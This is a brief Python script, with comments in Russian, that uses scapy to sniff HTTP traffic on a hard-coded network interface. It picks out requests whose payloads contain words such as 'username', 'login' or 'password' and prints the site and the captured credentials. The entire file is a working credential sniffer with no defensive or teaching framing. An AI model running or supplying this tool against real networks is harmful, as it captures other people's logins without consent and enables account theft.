#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    load = str(packet[scapy.Raw].load)
    # проверяем список слов в переменной load
    keywords = ['username', 'UserName', 'user', 'login', 'password', 'pass']
    for keyword in keywords:
        if keyword in load:
            return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # уровень http
        if packet.haslayer(scapy.Raw):     # уровнень Raw
            login_info = get_login_info(packet)
            if login_info:
                # в URL захватываем имя сайта
                url = get_url(packet)
                print("[+] HTTP Request >> " + url.decode('utf-8'))
                print("[+] Possible username/password >> " + str(login_info)[2:-1] + "\n\n")

sniff('eno1')
